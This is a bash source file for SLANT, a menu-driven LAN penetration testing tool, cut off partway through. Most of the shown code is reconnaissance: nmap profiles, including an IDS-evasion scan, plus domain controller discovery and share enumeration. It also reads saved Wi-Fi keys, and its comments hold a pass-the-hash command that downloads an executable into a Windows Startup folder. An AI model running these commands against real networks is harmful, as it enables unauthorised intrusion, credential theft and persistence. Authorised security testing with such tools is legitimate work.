#!/bin/bash
# set -x

# SLANT - Small Local Area Network Testing

# Script Info
# Limitations - The script starts getting unwieldy if more than 25 endpoints are found
# 
# Bugs (KNOWN)
# Information tab does not delineate between local domain and external domain (.local .lan .loc vs. .com .org .net etc...)
#
# CURRENTLY WORKING ON VIEW TARGET
#
# To Do
# Add Frag scan for router and give custom ports for them
# Add Domain tools ie... own box once Domain credentials are found psexec
# nmap -Pn --script=broadcast --script-args=newtargets -oA scantest1    # For Discovery Option
# DNSWalk
# Theharvester
# Add DNS Domain Name Brute
# Metagoofil
# Xprobe2
# Spider website for email addresses - 
# nmap -p80 --script http-email-harvest <Target>
# cat $tmp/c_string-192.168.10.* | awk '{ print $2 }' | sort -u -           # Gather SNMP strings to display in "information" tab

# PASS THE HASH 
# Upload FIle With PowerShell
# pth-winexe --user=$domain/$dom_usr%$hash //$n "powershell -Command (New-Object System.Net.WebClient).DownloadFile('http://$n/test.exe','c:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\test.exe')"
# pth-winexe --user=$domain/$dom_usr%$hash //$n //172.17.0.107 cmd.exe
# Then run test.exe from the C: drive
#
# WMIC - wmic -U domain.local/admin_username%'password' //Host_IP "select Caption from Win32_OperatingSystem" 
# WMIS - wmis -U domain.local/admin_username%'password' //Host_IP - Still need to research who WMIS belongs to.
# WMIS Example That Works - /data/tools/wmi-1.3.14/Samba/source/bin/wmic -U Administrator%'password' //server03 "select * from Win32_ComputerSystem"
# /data/tools/wmi-1.3.14/Samba/source/bin/wmic --workgroup domain -U Administrator%'password' //server05 "select * from Win32_ComputerSystem"
#
# Installing WMIC
# mkdir /data
# mkdir /data/tools
# cd /data/tools/
# wget http://www.openvas.org/download/wmi/wmi-1.3.14.tar.bz2
# bzip2 -cd wmi-1.3.14.tar.bz2 | tar xf -
# cd wmi-1.3.14/
# sudo make
# sudo cp Samba/source/bin/wmic /usr/local/bin/
#
# Add feature to Veiw Section to display only selected end point
#
# Added number of clients to information section eg... 
# Windows XP Workstations  -  46
# Windows 7  Workstations  -  102
#
# Enable larger client list ability - Or find a way to filter non-infrastructure devices
#
# Requirements ( Not part of Kali Linux ) - If you use these features
# WMIC - apt-get install wmic-client - Missing for now
# WMIS - apt-get install wmis
# Gedit - To open nmap reports from live report
# IMacros ( Firefox extention - For HTTP Brute forcing on odd sites ) ( Haven't tested in a while )
# NCrack
# Hydra
# Ming32 - For AV evasion script
# 


 
           script_name="SLANT - Small Local Area Network Testing"           # Program Name
               version="4.0"                                                # Version Number
                banner="on"                                                 # On/Off - Off to Suppress Banner
         wanip_timeout="10"                                                 # Timeout Value for Fetching WAN IP
                filter="off"                                                # Filter Dead Hosts (Change variable with "d")
            resolution="1680x980"                                           # Remote Desktop Screen Resolution

#__ Paths _________________________________________________________________________________________
                   tmp="/tmp/menu"                                          # Temp File Location - Starting Point For All Files that sLANt Uses
               logfile="$tmp/logfile"                                       # Output File
             wmic_path="/data/tools/wmi-1.3.14/Samba/source/bin/wmic"       # Path to WMIC Binary
      vlan_hopper_path="$(pwd)/router/frogger.sh"                           # Path to VLAN Hopper
          fake_ap_path="$(pwd)/fap/myfap.sh"                                # Path to Soft AP
       ssid_brute_path="$(pwd)/router/bin/hidden_ssid.py"                   # Path to Hidden SSID Brute Forcer
        dns_brute_path="$(pwd)/enumeration/dns_brute.sh"                    # Path to DNS Prefix Brute Force Script
       sniff_util_path="$(pwd)/g0tmi1k/sitm/sitm.sh"                        # Path to MITM Script
   router_exploit_path="$(pwd)/router/exploits"                             # Path to Router Exploit Modules
     hydra_module_path="$(pwd)/router/brute/hydra"                          # Path to Router Hydra Modules
   imacros_module_path="/root/Desktop/tools/router/brute/imacros"           # Path to IMacros Scripts-g 88 
           report_path="/root/Desktop/report"                               # Path to Report Output
              scan_dir="/tmp/menu/scans"                                    # Path to NMap Scan Directory
               pay_gen="/root/Desktop/tools/avbypass/crypter.py"            # Path to Payload Generator

              userlist="/tmp/userlist"                                      # Path to User List
              passlist="$(pwd)/wordlist/default.pwd"                        # Path to Short Brute Force List
        pref_save_path="$(pwd)/scans/"                                      # Path to Report and Archive To Be Saved

#__ RegEx _________________________________________________________________________________________
              firewall='(WAP|Linksys|Cisco|cisco|WatchGuard|Belkin|Sonicwall|Juniper|Netgear|D-Link|D-link|ZyXEL|Enterasys|Meraki|Ubiquiti|ProCurve|DRAC|drac|idrac)'  # Infrastructure Devices in Information Report
     interesting_ports='(21|22|23|25|53|80|88|135|137|139|161|389|443|445|3389|5353|8008|8080|62078)'                                   # Ports to Show in Live Report
          hide_ext_ips='yes'                                                                            # (Yes) Displays only LAN IPs (No) Displays LAN and WAN IPs

#__ NMap Scan Variables ___________________________________________________________________________
          do_sub_scan="no"                                                  # (yes/no) Run Scan for Sub Networks
            host_scan="host"
      ping_sweep_scan=" -T3 -sP -sn -n --stats-every 10s "
       host_disc_scan=" -T2 -sP -n --stats-every 10s "
      agg_router_scan=" -A -p U:161,1900,T:21-23,25,80,443,587,8080 -O --stats-every 10s "
             agg_scan=" -A -sV --open -O --osscan-guess --version-intensity 9 --host-timeout 100m --min-hostgroup 100 --max-rtt-timeout 600ms --initial-rtt-timeout=300ms --min-rtt-timeout 300ms --max-retries 8 --min-rate 150 --stats-every 10s -g 53 "
   agg_np_router_scan=" -Pn -sSV -sUV -p U:161,1900,T:21-23,25,80,443,587,8080 -sT -O --stats-every 10s "
          agg_np_scan=" -Pn -sSV -sUV -p U:53,67-69,79,123,135,137-139,161,162,500,514,520,523,631,998,1434,1701,1900,4500,5353,6481,17185,31337,49152,49154,T:13,21-23,25,37,42,49,53,67,69,79-81,88,105,109-111,113,123,135,137-139,143,161,179,222,384,389,407,443,445,465,500,512-515,523,524,540,548,554,617,623,631,689,705,783,873,910,912,921,993,995,1000,1024,1050,1080,1099,1100,1158,1220,1300,1311,1344,1352,1433-1435,1494,1521,1524,1533,1581-1582,1604,1720,1723,1755,1900,2000,2049,2100,2103,2121,2202,2207,2222,2323,2380,2525,2533,2598,2628,2638,2947,2967,3000,3031,3050,3057,3128,3260,3306,3333,3389,3500,3628,3632,3690,3780,3790,4000,4369,4445,5019,5051,5060-5061,5093,5168,5250,5353,5400,5405,5432-5433,5554-5555,5666,5672,5800,5850,5900-5910,5984,6000-6005,6050,6060,6070,6080,6101,6106,6112,6379,6405,6502-6504,6660,6666-6667,6697,7080,7144,7210,7510,7634,7777,7787,8000,8008-8009,8028,8030,8080-8081,8090,8091,8180,8222,8300,8332-8333,8400,8443-8444,8787,8800,8880,8888,8899,9080-9081,9090,9100,9111,9152,9160,9999-10000,10050,10202-10203,10443,10616,10628,11000,11211,12174,12203,12345,13500,14330,17185,18881,19150,19300,19810,20031,20222,22222,25000,25025,26000,26122,27017,28222,30000,35871,38292,41025,41523-41524,41364,44334,48992,49152,49663,50000-50004,50013,50030,50060,50070,50075,50090,57772,59034,60010,60030,62078,62514,65535 --open --script smb-os-discovery,smb-system-info,banner -O --osscan-guess --max-os-tries 1 --version-intensity 0 --host-timeout 5m --min-hostgroup 100 --max-rtt-timeout 600ms --initial-rtt-timeout=300ms --min-rtt-timeout 300ms --max-retries 3 --min-rate 150 --stats-every 10s -g 53 "
      nor_router_scan=" --stats-every 10s "
             nor_scan=" --stats-every 10s "
   nor_np_router_scan=" -Pn --stats-every 10s "
          nor_np_scan=" -Pn --stats-every 10s "
             min_scan=" -Pn -p T:21-23,80,443,8080 --stats-every 10s "
      slo_router_scan=" -sT -sV -sU -p U:53,161,1900,T:21-23,25,80,443,587,8080,49152 --script snmp-sysdescr.nse,upnp-info,http-default-accounts -O --stats-every 10s "
             slo_scan=' -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script "default or (discovery and safe)" --stats-every 10s '                                             # Comprehensive Scan
            frag_scan=" -D microsoft.com -sS -sV -T1 -f -mtu=24 -data-length=1228 --stats-every 10s"                        # Fragmented for IDS Evasion
     vuln_unsafe_scan=" -Pn -n --open -p139 --script=smb-check-vulns --script-args=unsafe=1 --stats-every 10s "
       vuln_safe_scan=" -Pn -n --open -p139 --script=smb-check-vulns --script-args=unsafe=0 --stats-every 10s "

#__ Nothing Below This Line _______________________________________________________________________

if [ "$(id -u)" != "0" ]; then display error "Run as root" 1>&2; cleanup ; fi
trap 'cleanup' 2             # Captures interrupt signal (Ctrl + C)       # Trap Interupt

orig_hostname="$(hostname)"                                               # Original Hostname 

echo "Lans v$vs" >> $logfile
mkdir $tmp
mkdir $tmp/data
touch $logfile
wd="$(pwd)"

function banner() {
   if [ $banner == "on" ] ; then
cat<<"EOF"
    ___  __    _   _  __ _____
  ,' _/ / /  .' \ / |/ //_  _/
 _\ `. / /_ / o // || /  / /  
/___,'/___//_n_//_/|_/  /_/   
Small Local Area Network Testing - Copyright 2013 Michael Clancy
EOF
   else
      echo "$script_name v$version - (C)opyright 2012 - Michael Clancy "
   fi

}
border="echo "#######################################################################################################################""

function ident() {                                                                   # Identify Network Characteristics
   ssid1="$ssid"
   gateway1="$gateway"
   if [ "$iface" == "" ] ; then
      interface=$(/sbin/ip route | awk '/default/ { print $5 }' | head -n 1)         # Interface to use - eth0, wlan0 etc...
   else
      interface="$iface"
   fi
   if [ ! -e "$tmp/gateway" ] ; then
      /sbin/ip route | grep $interface | awk '{ print $3 }' | head -n 1 > $tmp/gateway
      gateway=$(cat $tmp/gateway)   # Gateway IP Address   route -n | awk '{if($4=="UG")print $2}' or ip route show 0.0.0.0/0 dev wlan0 | cut -d\  -f3
#      if [ "$interface" == "at0" ] ; then
#         gateway="10.0.0.1"
#      else
#         gateway=$(hostname -i)                                                                         # Gateway IP Address Better Way
#      fi
   fi
   networkmask=$(ifconfig $interface | awk '/Mask/ {split ($4,A,":"); print A[2]}')                      # Netmask
   if [ ! -e "$tmp/lan_ip" ] ; then
      hostname -I | awk '{ print $1 }' > $tmp/lan_ip
   fi
   lan_ip=$(cat $tmp/lan_ip)                                                            # Local Area Network IP          # Local Area Network IP Better Way
   if [ ! -e "$tmp/broadcast" ] ; then
      ifconfig $interface | awk '/Bcast/ {split ($3,A,":"); print A[2]}' > $tmp/broadcast
   fi
   broadcast=$(cat $tmp/broadcast)                       # Broadcast Address
   perm_mac="$(macchanger -s $interface | grep Permanent | awk '{ print $3 }')"
   curr_mac="$(macchanger -s $interface | grep Current | awk '{ print $3 }')"
   wiface="wlan"
   monface="mon0"
   if [ "$interface" != "eth0" ] ; then 
      ssid="$(iwconfig $interface | grep ESSID | cut -d ':' -f2 | sed 's/\"//'g)"
      key="$(cat /etc/NetworkManager/system-connections/$ssid | grep psk= | cut -c5-26)"
   fi          #| cut -d '"' -f2 | head -1
   if [ "$ssid" != "$ssid1"  ] || [ "$gateway" != "$gateway1"  ]  ; then 
      rm $tmp/wanip 2>$logfile && wanip=""
   fi
   if [ "$sub" == "" ] ;then
      echo $gateway | cut -d "." -f1-3 > $tmp/cur_subnet
   fi
   info yes                                                                             # Refresh parsed data. Too slow if we parse every time we hit enter

#__ Identify Network Type _________________________________________________________________________

if [ ! -e "$tmp/domain_name" ] ; then
   cat /etc/resolv.conf | grep domain | awk '{ print $2 }' > $tmp/domain_name
fi
domain="$(cat $tmp/domain_name)"

# ip addr show |grep -w inet |grep -v 127.0.0.1|awk '{ print $2}'| cut -d "/" -f 2|head -n1       # Alternative method to get CIDR
if [ "$interface" != "" ] && [ "$lan_ip" != "" ]; then
   cidr=""
   ip4="${lan_ip##*.}"; x="${lan_ip%.*}" 
   ip3="${x##*.}"; x="${x%.*}"
   ip2="${x##*.}"; x="${x%.*}"
   ip1="${x##*.}"
   nm4="${networkmask##*.}"; x="${networkmask%.*}"
   nm3="${x##*.}"; x="${x%.*}"
   nm2="${x##*.}"; x="${x%.*}"
   nm1="${x##*.}"
   let sn1="$ip1&$nm1"
   let sn2="$ip2&$nm2"
   let sn3="$ip3&$nm3"
   let sn4="$ip1&$nm4"
   let en1="$ip1|(255-$nm1)"
   let en2="$ip2|(255-$nm2)"
   let en3="$ip3|(255-$nm3)"
   let en4="$ip4|(255-$nm4)"
   subnet=$sn1.$sn2.$sn3.$sn4
   endnet=$en1.$en2.$en3.$en4
   oldIFS=$IFS; IFS=.
   for dec in $networkmask; do
      case $dec in
         255) let cidr+=8;;
         254) let cidr+=7;;
         252) let cidr+=6;;
         248) let cidr+=5;;
         240) let cidr+=4;;
         224) let cidr+=3;;
         192) let cidr+=2;;
         128) let cidr+=1;;
         0);;
         *) display error "Bad input: dec ($dec)" 1>&2
       esac
   done
   IFS=$oldIFS
   echo "/0 0.0.0.0 4 billion - Class A
/1 128.0.0.0 2 billion - Class A
/2 192.0.0.0 1billion - Class A
/3 224.0.0.0 500 million - Class A
/4 240.0.0.0 250 million - Class A
/5 248.0.0.0 128 million - Class A
/6 252.0.0.0 64 million - Class A
/7 254.0.0.0 32 million - Class A
/8 255.0.0.0 16 million - Class A
/9 255.128.0.0 8 million - Class B
/10 255.192.0.0 4 million - Class B
/11 255.224.0.0 2 million - Class B
/12 255.240.0.0 1 million - Class B
/13 255.248.0.0 524288 - Class B
/14 255.252.0.0 262144 - Class B
/15 255.254.0.0 131072 - Class B
/16 255.255.0.0 65536 - Class B
/17 255.255.128.0 32768 - Class C
/18 255.255.192.0 16384 - Class C
/19 255.255.224.0 8192 - Class C
/20 255.255.240.0 4096 - Class C
/21 255.255.248.0 2048 - Class C
/22 255.255.252.0 1024 - Class C
/23 255.255.254.0 512 - Class C
/24 255.255.255.0 256 - Class C
/25 255.255.255.128 128 - Class C
/26 255.255.255.192 64 - Class C
/27 255.255.255.224 32 - Class C
/28 255.255.255.240 16 - Class C
/29 255.255.255.248 8 - Class C
/30 255.255.255.252 4 - Class C
/31 255.255.255.254 2 - Class C
/32 255.255.255.255 1 - Single Host" > $tmp/network_types
   network_type=$(cat $tmp/network_types | grep "/$cidr")
else
   network_type=""
fi
$cur_men
}

function action() {
   xterm="xterm" #Defaults
   command=$2
   x="1200"
   y="0"
   lines="15"
   if [ "$3" == "true" ]; then 
      xterm="$xterm -hold"
   fi
   if [ -z "$4" ]; then
      x=$(echo $4 | cut -d '|' -f1)
      y=$(echo $4 | cut -d '|' -f2)
      lines=$(echo $4 | cut -d '|' -f3)
   fi
   $xterm -geometry 87x$lines+$x+$y -T "LATeral v$version - $1" -e "$command"
   return 0
}

function external_ip() {                                                  # External Facing IP Address
   action "Finding WAN IP" "/usr/bin/curl --connect-timeout $wanip_timeout ifconfig.me > $tmp/wanip" "false" "1200|0|0"
   wanip="$(cat $tmp/wanip)"
   if [ "$wanip" == "" ] ; then
      echo "Unreachable" > $tmp/wanip
   else
      temp="$(echo $wanip | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -v 1.1.1.1)"      # Test for IP address or redirect page
      echo $temp
      if [ "$temp" == "" ] ; then
         echo -e "Redirected" > $tmp/wanip                                   # This tells us we have a redirected DNS or captive portal
      fi
   fi
   info
}

function cleanup() {                                                      # Cleanup
   clear
   banner
   $border
   echo -e "#                                       \e[01;36mOPTION TO QUIT\e[00m                                                                #"
   $border
   echo
   read -p "$error QUIT? - (y)es or (n)o >>> "
   if [[ "$REPLY" =~ ^[Yy]$ ]] ; then
      display info "cleaning up"
      command="$(iwconfig 2>$logfile | grep "Mode:Monitor" | awk '{print $1}')"
      if [ -k $command ] ; then
         for i in $command ; do
            action "Stopping $wiface" "airmon-ng stop $i" "false"
         done
      fi
      rm -rf $tmp 2>$logfile
      if [ "$ident" == "true" ]; then                                     # Return Hostname and MAC Address back to normal
         hostname $orig_hostname
         ifconfig $iface down
         macchanger -r $iface
         ifconfig $iface up
         /etc/init.d/network-manager restart
      fi
      exit 0
   else
      info && $cur_men
   fi
}

function display() {                                                      # Display type message
   output=""
   if [ "$1" == "action" ]; then 
      output="\e[01;32m[>]\e[00m"
   elif [ "$1" == "info" ]; then 
      output="\e[01;33m[i]\e[00m"
   elif [ "$1" == "error" ]; then 
      output="\e[01;31m[!]\e[00m"; fi
   output="$output $2"
   echo -e "$output"
}
error="$(display error)"
info="$(display info)"
action="$(display action)"

function bnr_tgl() {                                                      # Turn Banner off and on
   if [ "$banner" == "on" ]; then 
      banner="off"
   elif [ "$banner" == "off" ]; then 
      banner="on"
   fi
   ident
}

function filter() {                                                       # Filter dead hosts in live report
   if [ "$filter" == "on" ]; then 
      filter="off"
   else
      filter="on"
   fi
   ident
}

function man_dom {                                                        # If Domain name not found automatically in "Information" section. It can be added manually.
   read -p "$action Enter Domain Name >>> " domain
   echo $domain > $tmp/domain_name
   $cur_men
}

#__ Subnet Switching ______________________________________________________________________________
function sub_switch {                                                     # "Information" Section - Switch to target different pool of IP addresses
   rm -rf $tmp/subs
   subs="$(cat $tmp/subnets)"
   clear
   banner
   targeting="$(cat $tmp/targeting)"
   $border
   printf "# \e[01;32m%-38s\e[00m \e[01;36mSWITCH SUBNETS\e[00m                                  \e[01;33m[press (s)can Hosts]\e[00m           #\n" "$targeting"
   $border
   display info ""
   i="0"
      echo -e "\e[01;36mNum  | Subnetwork\e[00m"
   for s in $subs ; do
      i=$(($i+1))
      echo -e "\e[01;36m-----|-------------------\e[00m" >> $tmp/subs
      printf "%-4s \e[01;36m|\e[00m %-17s\n" "$i" "$s" >> $tmp/subs
   done
   cat $tmp/subs
   echo
   $border
   read -p "$action Select Subnet to Target >>> " sub
   if [[ "$iface" =~ ^[Qq]$ ]] ; then $cur_men ; fi
#   aux_menu
   cat $tmp/subs | grep -w "$sub" | awk '{ print $3 }' | cut -d "." -f1-3 > $tmp/cur_subnet
   echo $sub && sleep 3

#   cat $scan_dir/* 2>$logfile | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -E '(^192\.|^10\.[]|^172\.1[6-9]|^172\.2[0-9]|^172\.3[0-1])' | sort -u | grep -vE '(.255$|0$)' >> $tmp/list_$sub
   grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' $scan_dir/* 2>$logfile | sort -u | grep -vE '(.255$|0$)' >> $tmp/list_$sub
   sort -t. -n -k 4 -u $tmp/list_$sub >> $tmp/list1_$sub
   cat $tmp/list1_$sub > $tmp/list_$sub
   info
}

function shares {                                                         # Enumerate Share Information
   if [ ! -e "$tmp/smbtree" ] || [ "$1" == "1" ] ; then
      if [ "$tmpsmb" == "" ] ; then
         clear
         banner
         $border
         echo -e "#                                           \e[01;36mSHARE ENUMERATION\e[00m                                                         #"
         $border
         display info "Enumerating File Shares"
         smbtree -N > $tmp/smbtree &
      fi
   fi
   clear
   banner
   $border
   echo -e "#                                           \e[01;36mSHARE ENUMERATION\e[00m                                                         #"
   $border
   cat $tmp/smbtree
   $border
   smbtmp="$(ps -A | grep smbtree)"
   if [ "$smbtmp" != "" ] ; then
      display action "Still Enumerating - (enter) to refresh"
   fi
   echo
   echo -e "\e[01;36m<<SHARE MENU>>\e[00m"
   echo -e "\e[01;36m1)\e[00m Enumerate again"
   echo -e "\e[01;36mQ)\e[00m Return Previous Menu"
   echo
   read -p "$action Choose Option >>> " menu_choice
   case $menu_choice in
   1 ) shares 1 ;;
   q|Q ) information ;;
   * ) shares ;;
   esac
}

#__ Network Tools _________________________________________________________________________________
function information {                                                        # Information Menu
#      if [ "$hide_ext_ips" == "yes" ] ; then
#         grep -v initiated $tmp/subnet_scan | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -E '(^127\.0\.0\.1|^192\.|^10\.|^172\.1[6-9]|^172\.2[0-9]|^172\.3[0-1])' | sort -u > $tmp/tmp
#      else
         grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' $tmp/subnet_scan | sort -u > $tmp/tmp
#      fi
   
   f="$(cat $tmp/tmp)"
   for z in $f ; do
      echo $z/24 >> $tmp/subnets1
      cat $tmp/subnets1 | sort -u > subnets2
      cat $tmp/subnets2 > subnets1                                           # Keeps subnets1 from getting unwieldy
      rm $tmp/subnets2 2>$logfile 
   done
#   cur_men="information"
   echo $gateway/$cidr >> $tmp/subnets1
   sort -u $tmp/subnets1 | sort -t. -n -k 4 > $tmp/subnets
#   if [ "$domain" == "" ] ; then
#      domain="$(hostname -d)"
#   fi


   clear
   banner
   $border
   echo -e "#                                          \e[01;36mNETWORK INFORMATION\e[00m                                                        #"
   $border
   printf "$info%-20s \e[01;36m|\e[00m %-36s$info%-20s \e[01;36m|\e[00m %-17s\n" "Local Hostname" ""$(hostname)"" "Interface" "$interface"
   printf "$info%-20s \e[01;36m|\e[00m %-36s$info%-20s \e[01;36m|\e[00m %-17s\n" "Interface" "$interface" "Interface" "$interface"
   printf "$info%-20s \e[01;36m|\e[00m %-36s$info%-20s \e[01;36m|\e[00m %-17s\n" "Gateway" "$gateway"
   printf "$info%-20s \e[01;36m|\e[00m %-36s$info%-20s \e[01;36m|\e[00m %-17s\n" "LAN IP" "$lan_ip"
   printf "$info%-20s \e[01;36m|\e[00m %-36s$info%-20s \e[01;36m|\e[00m %-17s\n" "Network Mask" "$networkmask"
   printf "$info%-20s \e[01;36m|\e[00m %-36s$info%-20s \e[01;36m|\e[00m %-17s\n" "WAN IP" "$wanip"
   if [ "$domain" == "" ] ; then
      printf "$action%-20s \e[01;36m|\e[00m %-36s$info%-20s \e[01;36m|\e[00m %-17s\n" "Domain Name" "Select Option [3] to Manually Enter"
   else
      printf "$info%-20s \e[01;36m|\e[00m %-36s$info%-20s \e[01;36m|\e[00m %-17s\n" "Domain Name" "$domain"
   fi
   
#   printf "$info%-20s \e[01;36m|\e[00m %-36s$info%-20s \e[01;36m|\e[00m %-17s\n" "Perm MAC Address" "$perm_mac" 
   if [ "$perm_mac" == "$curr_mac" ] ; then
      printf "$info%-20s \e[01;36m|\e[00m %-36s$info%-20s \e[01;36m|\e[00m %-17s\n" "Perm MAC Address" "$perm_mac"
   else
      printf "$info%-20s \e[01;36m|\e[00m %-36s$info%-20s \e[01;36m|\e[00m %-17s\n" "Perm MAC Address" "$perm_mac" "Spoofed MAC Address" "$curr_mac"
   fi
   printf "$info%-20s \e[01;36m|\e[00m %-36s$info%-20s \e[01;36m|\e[00m %-17s\n" "Broadcast Address" "$broadcast"
   printf "$info%-20s \e[01;36m|\e[00m %-36s$info%-20s \e[01;36m|\e[00m %-17s\n" "Network Range" "$network_type"
#   echo -e "#                                       \e[01;36mSUBNETWORKS\e[00m                                                                   #"
      
      if [ -e "$tmp/subnets" ] ; then
         printf "\e[01;36m-------------------------|--------------------SUBNETWORKS-------------------------------------------------------------\e[00m\n"
         cat $tmp/subnets | while read line ; do
            printf "$info%-20s \e[01;36m|\e[00m\n" "$line" 
         done
      fi

   if [ "$domain" != "" ] ; then
      if [ ! -e "$tmp/record" ] ; then
         dig -t ANY $domain  +answer | grep $domain | grep -Ev '(DiG|ANY)' > $tmp/record
         # dig  mail.$domain | grep mail.$domain | grep -v \; >> $tmp/record
         dig  mail.$domain | grep mail.$domain | grep -v \; | awk '{ print $5 }' > $tmp/exch
         dig -t any _ldap._tcp.dc._msdcs.$domain > $tmp/dom
         cat $tmp/dom  | grep $domain | grep -E '([0-9]{1,3}\.){3}[0-9]{1,3}' | while read line
            do
               dom_name="$(echo $line | awk '{ print $1 }')"
               dom_ip="$(echo $line | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}')"
               name_serv="$(cat /etc/resolv.conf | grep $dom_ip)"
               primary="$(cat $tmp/record | grep "$dom_name" | grep SOA)"
               if [ "$primary" != "" ] ; then primary="- Primary DC" ; fi
               if [ "$name_serv" == "" ] ; then
                  printf "$info%-20s \e[01;36m|\e[00m %-60s \e[01;36m|\e[00m \e[01;32m%-60s\e[00m\n" "$dom_ip" "$dom_name" "$primary" >> $tmp/domain_dig
               else
                  printf "$info%-20s \e[01;36m|\e[00m %-60s \e[01;36m|\e[00m \e[01;32m%-60s\e[00m\n" "$dom_ip" "$dom_name" "Nameserver $primary" >> $tmp/domain_dig
               fi
            done
            cat $tmp/record | grep MX | awk '{ print $6 }' >> $tmp/exch
            dig="$(cat $tmp/exch)"
            for i in $dig ; do
               exch_ip="$(ping -c 2 $i | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | head -n1)"
               printf "$info%-20s \e[01;36m|\e[00m %-60s \e[01;36m|\e[00m \e[01;32m%-60s\e[00m\n" "$exch_ip" "$i" "Mail Server" >> $tmp/exchange
            done
      fi
      if [ -e "$tmp/domain_dig" ] ; then
         printf "\e[01;36m-------------------------|-----------------DOMAIN CONTROLLERS---------------------------|-----------------------------\e[00m\n"
         cat $tmp/domain_dig
      fi
      if [ -e "$tmp/exchange" ] ; then
         printf "\e[01;36m-------------------------|------------------EXCHANGE SERVERS----------------------------------------------------------\e[00m\n"
         cat $tmp/exchange
      fi
#__ Subdomains ____________________________________________________________________________________
      if [ -e "$tmp/subdomain" ] ; then
         printf "\e[01;36m----------------------------------------------SUBDOMAINS--------------------------------------------------------------\e[00m\n"
         cat $tmp/subdomain
      else
         $(pwd)/enumeration/subdomainLookup.py $domain | egrep -v '(subdomains)' | sed '/^$/d' > $tmp/subdomain
         if [ -e "$tmp/subdomain" ] ; then
            printf "\e[01;36m----------------------------------------------SUBDOMAINS--------------------------------------------------------------\e[00m\n"
            cat $tmp/subdomain
         fi
      fi
#__ DiG Information _______________________________________________________________________________
      if [ -e "$tmp/record" ] ; then
         printf "\e[01;36m--------------------------------------------DiG INFORMATION-----------------------------------------------------------\e[00m\n"
         cat $tmp/record
      fi

#__ Firewalls/Switches/Routers ____________________________________________________________________
      if [ -e $scan_dir ] ; then
         egrep $firewall $scan_dir/*.nmap | sed 's/.nmap:/\t\t\t/g' | sed 's/\/tmp\/menu\/scans\///g' | cut -c1-85 | sort -u -t. -n -k 4 | uniq > $tmp/firewalls
         if [ -e "$tmp/firewalls" ] ; then
            printf "\e[01;36m-----------------------------------------Infrastructure Devices-------------------------------------------------------\e[00m\n"
            cat $tmp/firewalls | while read line ; do
               echo "$info$line"
            done
#         cat $scan_dir/firewalls
         fi
      fi
# __ Windows Server List __________________________________________________________________________
      if [ -e $scan_dir ] ; then
         grep -H "server" $scan_dir/*.nmap | cut -d ':' -f1,6 | sort -t. -n -k 4 | grep windows_server | sed 's/.nmap:/ /g' | sed 's?^.*/??' | uniq > $tmp/servers
         if [ -e $tmp/servers ] ; then
            printf "\e[01;36m--------------------------------------------WINDOWS SERVERS-----------------------------------------------------------\e[00m\n"
            cat $tmp/servers | while read line ; do
               ip="$(echo $line | awk '{ print $1 }')"
               os="$(echo $line | awk '{ print $2 }')"
               name="$(cat $tmp/ns_$ip | head -n1)"
               if [ "$name" == "" ] && [ -e $scan_dir/$ip.nmap ] ; then
                  name="$(grep "Computer name: " $scan_dir/$ip.nmap | awk '{ print $4 }' | head -n1 | cut -c1-18)"
               fi
               printf "$info%-27s %-25s %-25s\n" "$ip" "$os" "$name"
            done
         fi
      fi
# __ Windows XP List ______________________________________________________________________________
#set -x
      if [ -e $scan_dir ] ; then
         grep -H "Windows XP" $scan_dir/*.nmap | cut -d ':' -f1,6 | sort -t. -n -k 4 | grep "Windows XP" | sed 's/.nmap:/ /g' | sed 's?^.*/??' | uniq > $tmp/xp
         if [ -e $tmp/servers ] ; then
            printf "\e[01;36m--------------------------------------------WINDOWS XP---------------------------------------------------------------\e[00m\n"
            cat $tmp/xp | while read line ; do
               ip="$(echo $line | awk '{ print $1 }')"
               os="$(echo $line | awk '{ print $2 }')"
               name="$(cat $tmp/ns_$ip | head -n1)"
               if [ "$name" == "" ] && [ -e $scan_dir/$ip.nmap ] ; then
                  name="$(grep "Computer name: " $scan_dir/$ip.nmap | awk '{ print $4 }' | head -n1 | cut -c1-18)"
               fi
               printf "$info%-27s %-25s %-25s\n" "$ip" "$os" "$name"
            done
         fi
      fi
   else
      read -p "$action Domain Name is Not Specified >>> " domain
      echo $domain > $tmp/domain_name
      information
   fi
#set +x

#   echo -e "#                                       \e[01;36mDiG INFORMATION\e[00m                                                               #"
#   $border

   $border
   echo
   echo -e "\e[01;36m<<INFORMATION MENU>>\e[00m"
   echo -e "\e[01;36m1)\e[00m View Shares"
   echo -e "\e[01;36m2)\e[00m Switch to Different Subnet"
   echo -e "\e[01;36m3)\e[00m Manually Add Subnet"
   echo -e "\e[01;36m4)\e[00m Change Domain Name"
   echo -e "\e[01;36m5)\e[00m Refresh Information"
   echo -e "\e[01;36m6)\e[00m Clear Domain and Information"
   echo -e "\e[01;36mQ)\e[00m Return Previous Menu"
   echo
   read -p "$action Choose Option >>> " menu_choice

   case $menu_choice in
   1 ) shares ;;
   2 ) netdiscover switch ;;
   3 ) sub_man ;;
   4 ) man_dom ;;
   5 ) rm $tmp/record $tmp/exchange $tmp/domain_dig ;;
   6 ) domain="" && rm $tmp/record $tmp/exchange $tmp/domain_dig ;;
   q|Q ) info no && mainmenu ;;
   * ) information ;;
   esac
   information
}

function aux_menu() {
   case $menu_choice in
   v|V ) util nmap View ;;
   e|E ) info && external_ip ;;
   r|R ) ident ;;
   f|F ) filter ;;
   s|S ) netdiscover ;;
   m|M ) sub_man ;;
   c|C ) clear_targets ;;
   b|B ) bnr_tgl ;;
   i|I ) information ;;
   l|L ) load_archive ;;
   h|H|help|HELP ) in_help ;;
   * ) info && $cur_men ;;
   esac
}

#__ Tools Functions _______________________________________________________________________________
function fap() {                                                          # Start a Fake Access Point
   action "Fake Access Point Utility" "$fake_ap_path" "true" &
   echo fap="true" >> $tmp/fap.lst
   $cur_men
}

function sniff() {                                                        # Start Sniffing Utility
   #action "Network Sniffing Utility" "$sniff_util_path" "true" &
   cur_men="sniff"
   info
   echo 
   echo -e "\e[01;36m<<SNIFF MENU>>\e[00m"
